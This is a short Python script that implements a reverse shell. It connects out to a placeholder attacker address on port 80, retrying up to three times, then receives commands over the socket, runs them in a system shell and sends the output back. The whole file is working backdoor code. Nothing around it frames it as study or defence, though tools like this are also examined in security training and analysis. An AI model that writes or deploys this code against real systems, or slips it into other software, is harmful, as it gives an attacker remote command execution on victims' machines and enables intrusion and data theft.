#!/usr/bin/python3

import subprocess
import socket
from time import sleep


def linux_exec(command):
	try:
		proc = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE,  stdout=subprocess.PIPE, stdin=subprocess.PIPE)
		result = proc.stdout.read() + proc.stderr.read()
		return result
	except Exception as error:
		return error
		
		
connected = False

for i in range(3):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('IP_address', 80))	# change this
		connected = True
		break
	except:
		sleep(20)
		
while connected:
	response = s.recv(1024)
	command_result = linux_exec(response)
	s.send(command_result)
